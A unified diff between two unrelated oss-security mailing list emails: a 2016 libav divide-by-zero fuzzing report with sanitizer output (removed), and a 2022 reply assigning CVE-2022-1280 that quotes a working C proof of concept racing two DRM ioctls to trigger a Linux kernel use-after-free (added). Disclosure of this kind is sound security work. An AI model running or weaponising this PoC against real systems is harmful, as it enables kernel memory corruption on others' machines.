@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["3337" "Wednesday" "21" "September" "2016" "17:28:31" "+0200" "Agostino Sarubbo" "ago@gentoo.org" "<1512070.Ry1Vm5FAnA@willoughby>" "87" "[oss-security] libav: divide-by-zero in sbr_make_f_master (aacsbr.c)" nil nil nil "9" "2016092115:28:31" "[oss-security] libav: divide-by-zero in sbr_make_f_master (aacsbr.c)" (number mark "U       ago@gentoo.o Sep 21   87/3337  " thread-indent "\"[oss-security] libav: divide-by-zero in sbr_make_f_master (aacsbr.c)\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0000
-X-Mozilla-Status2: 00000000
-Received: (qmail 30438 invoked by uid 550); 21 Sep 2016 15:28:53 -0000
+Received: (qmail 29862 invoked by uid 550); 13 Apr 2022 06:51:10 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,102 +7,121 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 30393 invoked from network); 21 Sep 2016 15:28:50 -0000
-From: Agostino Sarubbo <ago@gentoo.org>
+Received: (qmail 29843 invoked from network); 13 Apr 2022 06:51:09 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20210112;
+        h=sender:date:from:to:subject:message-id:references:mime-version
+         :content-disposition:in-reply-to;
+        bh=qOYYa5wq7s2Y5YD9luIr3fpSrwYcKV3uYWLdY6JzL5M=;
+        b=G3S0i4eVVxZFcqC3573fpPg6CjkqQ4++MmfZapcEKRJ/Y/OSuUuPPgbgN/QNdw96ui
+         HXhvsODMI6yqMJkHPjag42MtGosnhtV9B1vvOwjV1ZQ8YSuuYEc/bMVVog3yPg7fp0fm
+         4AmdBeYyghLec4oi/9wM1geEWmxSib9hO4eur7Hf9bINU769sNpsY+M979PNU8YOtAPN
+         oQ9cRLkOfbuJg8qcXS55LNiHkZxW4r71qXOT+dDXNQcWh7lhiJCxLpilNU5Qk/4vIo0x
+         StdnLrcKkXe7+6VwI0WrKrmxjP+dgX7xCaJguGIWWS4IrDm0hTxpdBGpwHDupO1Z+WOj
+         e91g==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20210112;
+        h=x-gm-message-state:sender:date:from:to:subject:message-id
+         :references:mime-version:content-disposition:in-reply-to;
+        bh=qOYYa5wq7s2Y5YD9luIr3fpSrwYcKV3uYWLdY6JzL5M=;
+        b=5nkxfGroeMX3rJYq3KEedWliTXZJuWPCPZ8qF64bBQI170sMd6WRsskLUyIKM6nnpx
+         kW+IwNrgx7f96xinishVc1tbw38hBh1risBHt9029h2RrlY7wjXkjAN4s3UgD5U4iEmI
+         Dde043I5r+jXOA66Pl/OumxH3L3e/ElSd1p+F51JKgLYSyPiOzrbk4jAFevHd+WPG5PJ
+         mq7saGlicypX3mjBZChyhGNehAqpmlA+y937yaAIxIqmok3MkDImX3UVAzgGtbpDrWKe
+         djE43mM7K3bhGWMoX+l/wB4H7YsFgPouRru/b/hVfkm/myZhir7HQfmE0O3KtqX/fT/C
+         r5Xw==
+X-Gm-Message-State: AOAM530+DKimdk1di6MRo9gFvhJWQQYUZx9haM0gKBriu0tcakrAFr3f
+	JoX99QeSL94NR/Gaqxet5r0VCr58HLUgLw==
+X-Google-Smtp-Source: ABdhPJwLga9kGhtNy2uCtrNmsyqHN1umHcK4/q/T14ZywvAKBvOmcj8zTOraDt5uB8GlLXQjtqqZxA==
+X-Received: by 2002:adf:dc90:0:b0:207:aa5c:8524 with SMTP id r16-20020adfdc90000000b00207aa5c8524mr8607969wrj.523.1649832658478;
+        Tue, 12 Apr 2022 23:50:58 -0700 (PDT)
+Sender: Salvatore Bonaccorso <salvatore.bonaccorso@gmail.com>
+Date: Wed, 13 Apr 2022 08:50:57 +0200
+From: Salvatore Bonaccorso <carnil@debian.org>
 To: oss-security@lists.openwall.com
-Cc: cve-assign@mitre.org
-Date: Wed, 21 Sep 2016 17:28:31 +0200
-Message-ID: <1512070.Ry1Vm5FAnA@willoughby>
-User-Agent: KMail/4.14.10 (Linux/4.4.6-gentoo; KDE/4.14.24; x86_64; ; )
+Message-ID: <YlZy0dacHoITqtOt@eldamar.lan>
+References: <CAH5WSp6-nveUGNR8cEdXbFQs0m3AsDmhoN9sDx+WXfn2JsdjHg@mail.gmail.com>
 MIME-Version: 1.0
-Content-Transfer-Encoding: 7Bit
-Content-Type: text/plain; charset="utf-8"
-Subject: [oss-security] libav: divide-by-zero in sbr_make_f_master (aacsbr.c)
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+In-Reply-To: <CAH5WSp6-nveUGNR8cEdXbFQs0m3AsDmhoN9sDx+WXfn2JsdjHg@mail.gmail.com>
+Subject: Re: [oss-security] Linux kernel: A concurrency use-after-free
+ between drm_setmaster_ioctl and drm_mode_getresources
 
-If it is suitable for a CVE please assign one. 
-Thanks.
+Hi,
 
-Description:
-Libav is an open source set of tools for audio and video processing.
+On Tue, Apr 12, 2022 at 07:42:04PM +0800, Minh Yuan wrote:
+> Hi guys,
+> 
+> We recently discovered a concurrency uaf in drm of the latest kernel
+> version (Linux 4.19.237).
+> 
+> The root cause of this race is that drm_setmaster_ioctl can free an old
+> *fpriv->master* in drm_new_set_master, while drm_mode_getresources holds a
+> freed *fpriv->master *in drm_lease_held due to the absence of proper
+> lock/refcounting.
+> 
+> My unstable PoC is shown below (tested on Linux 4.19.237):
+> 
+> #include <endian.h>
+> #include <stdint.h>
+> #include <stdio.h>
+> #include <stdlib.h>
+> #include <string.h>
+> #include <sys/syscall.h>
+> #include <sys/types.h>
+> #include <unistd.h>
+> #include <errno.h>
+> #include <fcntl.h>
+> #include <sys/stat.h>
+> #include <sys/mman.h>
+> #include <pthread.h>
+> #include <sys/xattr.h>
+> #include <sys/shm.h>
+> #include <linux/userfaultfd.h>
+> #include <sys/ioctl.h>
+> #include <drm/drm.h>
+> #include <drm/drm_mode.h>
+> 
+> #define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
+> } while (0)
+> int fd;
+> char a[0x100];
+> void *thread1(void *arg)
+> {
+> 
+> ioctl(fd, DRM_IOCTL_SET_MASTER, 0);
+> 
+> }
+> void *thread2(void *arg)
+> {
+> ioctl(fd, DRM_IOCTL_MODE_GETRESOURCES, &a);
+> }
+> int main(void)
+> {
+> pthread_t thr1,thr2;
+> 
+> int fd1 = open("/dev/dri/card0",0);
+> fd = open("/dev/dri/card0",0);
+> int fd2 = dup3(fd,fd1,0);
+> int s = pthread_create(&thr1,NULL,thread1,(void*)NULL);
+> if(s != 0)
+> errExit("pthread_create");
+> s = pthread_create(&thr2,NULL,thread2,(void*)NULL);
+> if(s != 0)
+> errExit("pthread_create");
+> pthread_join(thr1,NULL);
+> pthread_join(thr2,NULL);
+> close(fd);
+> }
+> 
+> Timeline:
+> * 03.30.22 - Vulnerability reported to security@kernel.org.
+> * 04.01.22 - Vulnerability reported to linux-distros@vs.openwall.org
+> <security@kernel.org>.
+> * 04.12.22 - Vulnerability opened.
 
-A fuzzing with an mp3 file as input discovered a divide-by-zero in 
-sbr_make_f_master.
+This should have CVE-2022-1280 assigned.
 
-The complete ASan output:
-# avconv -i $FILE -f null -
-avconv version 11.7, Copyright (c) 2000-2016 the Libav developers
-  built on Aug 16 2016 15:34:42 with clang version 3.8.1 
-(tags/RELEASE_381/final)
-[mpeg @ 0x61a00001f280] Format detected only with low score of 25, 
-misdetection possible!
-[aac @ 0x619000000580] Sample rate index in program config element does not 
-match the sample rate index configured by the container.
-[aac @ 0x619000000580] SBR was found before the first channel element.
-ASAN:DEADLYSIGNAL
-=================================================================
-==29103==ERROR: AddressSanitizer: FPE on unknown address 0x7fbd80295491 (pc 
-0x7fbd80295491 bp 0x7ffde63eb2f0 sp 0x7ffde63eafa0 T0)
-    #0 0x7fbd80295490 in sbr_make_f_master /var/tmp/portage/media-
-video/libav-11.7/work/libav-11.7/libavcodec/aacsbr.c:338:57
-    #1 0x7fbd80295490 in sbr_reset /var/tmp/portage/media-
-video/libav-11.7/work/libav-11.7/libavcodec/aacsbr.c:1045
-    #2 0x7fbd80295490 in ff_decode_sbr_extension /var/tmp/portage/media-
-video/libav-11.7/work/libav-11.7/libavcodec/aacsbr.c:1093
-    #3 0x7fbd801efe1b in decode_extension_payload /var/tmp/portage/media-
-video/libav-11.7/work/libav-11.7/libavcodec/aacdec.c:2196:15
-    #4 0x7fbd801efe1b in aac_decode_frame_int /var/tmp/portage/media-
-video/libav-11.7/work/libav-11.7/libavcodec/aacdec.c:2866
-    #5 0x7fbd801d3bbb in aac_decode_frame /var/tmp/portage/media-
-video/libav-11.7/work/libav-11.7/libavcodec/aacdec.c:2959:15
-    #6 0x7fbd823ed42a in avcodec_decode_audio4 /var/tmp/portage/media-
-video/libav-11.7/work/libav-11.7/libavcodec/utils.c:1657:15
-    #7 0x7fbd83f00b20 in try_decode_frame /var/tmp/portage/media-
-video/libav-11.7/work/libav-11.7/libavformat/utils.c:1914:19
-    #8 0x7fbd83ef76e2 in avformat_find_stream_info /var/tmp/portage/media-
-video/libav-11.7/work/libav-11.7/libavformat/utils.c:2276:9
-    #9 0x50d195 in open_input_file /var/tmp/portage/media-
-video/libav-11.7/work/libav-11.7/avconv_opt.c:726:11
-    #10 0x50b625 in open_files /var/tmp/portage/media-
-video/libav-11.7/work/libav-11.7/avconv_opt.c:2127:15
-    #11 0x50af81 in avconv_parse_options /var/tmp/portage/media-
-video/libav-11.7/work/libav-11.7/avconv_opt.c:2164:11
-    #12 0x541414 in main /var/tmp/portage/media-
-video/libav-11.7/work/libav-11.7/avconv.c:2630:11
-    #13 0x7fbd7e77f61f in __libc_start_main /var/tmp/portage/sys-
-libs/glibc-2.22-r4/work/glibc-2.22/csu/libc-start.c:289
-    #14 0x41d098 in _init (/usr/bin/avconv+0x41d098)
-
-AddressSanitizer can not provide additional info.
-SUMMARY: AddressSanitizer: FPE /var/tmp/portage/media-
-video/libav-11.7/work/libav-11.7/libavcodec/aacsbr.c:338:57 in 
-sbr_make_f_master
-==29103==ABORTING
-
-Affected version:
-11.7
-
-Fixed version:
-N/A
-
-Commit fix:
-N/A
-
-Credit:
-This bug was discovered by Agostino Sarubbo of Gentoo.
-
-CVE:
-N/A
-
-Timeline:
-2016-08-15: bug discovered
-2016-08-16: bug reported to upstream
-2016-09-21: blog post about the issue
-
-Note:
-This bug was found with American Fuzzy Lop.
-
-Permalink:
-https://blogs.gentoo.org/ago/2016/09/21/libav-divide-by-zero-in-sbr_make_f_master-aacsbr-c/
-
---
-Agostino
+Regards,
+Salvatore
